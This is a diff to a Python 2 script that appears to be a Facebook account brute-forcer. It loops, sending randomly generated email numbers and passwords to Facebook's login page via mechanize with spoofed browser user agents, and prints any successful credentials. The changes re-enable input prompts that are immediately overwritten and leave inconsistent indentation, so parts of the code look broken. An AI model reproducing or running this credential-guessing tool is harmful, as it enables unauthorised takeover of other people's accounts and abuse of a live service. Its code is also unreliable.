@@ -154,10 +154,10 @@ while (loop == 'true'):
 
 def motah():
      
-     #email = str(raw_input("email"))
+     email = str(raw_input("email"))
      email = str(random.randint(11111111,99999999))
      go = kk + email
-     #password = str(raw_input("bass" ))
+     password = str(raw_input("bass" ))
      password = str(random.randint(11111111,99999999))
      login = 'https://www.facebook.com/login.php?login_attempt=1'
      useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
@@ -168,7 +168,7 @@ def motah():
      br.set_handle_redirect(True)
      br.set_cookiejar(amer)
      br.set_handle_equiv(True)
-     # br.set_handle_referer(True)
+     br.set_handle_referer(True)
      br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=5) 
      br.addheaders = [('User-agent', random.choice(useragents))]
      site = br.open(login)
@@ -190,6 +190,6 @@ def motah():
        print g,"[*]pass ---------> ",g,go
        print y,"--------------------------------"
      motah()
-    raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
+raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
     if __name__ == '__main__':
     	main()
